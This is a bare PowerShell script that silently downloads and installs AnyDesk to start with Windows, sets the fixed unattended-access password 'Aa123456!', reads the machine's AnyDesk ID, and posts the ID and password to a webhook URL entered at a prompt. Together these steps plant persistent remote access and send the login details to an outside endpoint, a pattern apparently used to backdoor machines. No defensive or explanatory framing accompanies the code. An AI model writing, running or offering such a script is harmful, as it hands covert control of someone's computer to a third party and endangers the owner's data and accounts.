$url = "https://download.anydesk.com/AnyDesk.exe"
$outputPath = "C:\AnyDesk.exe"

Invoke-WebRequest -Uri $url -OutFile $outputPath

C:\AnyDesk.exe --install "C:\Program Files (x86)\AnyDesk" --start-with-win --silent

Start-Sleep -Seconds 5

cmd /c 'echo Aa123456! | "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --set-password'

Start-Process -FilePath "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" -ArgumentList "--get-id" -RedirectStandardOutput "C:\Program Files (x86)\AnyDesk\AnyDesk_Output.txt" -NoNewWindow -Wait

$ID = Get-Content -Path "C:\Program Files (x86)\AnyDesk\AnyDesk_Output.txt" | ForEach-Object { $_.Trim() }

$webhookUrl = Read-Host -Prompt 'Input the Webhook URL: '

# Send the request to the webhook
Invoke-WebRequest -Uri $webhookUrl -Method Post -Body "AnyDesk ID is: $ID AND Password is: Aa123456!"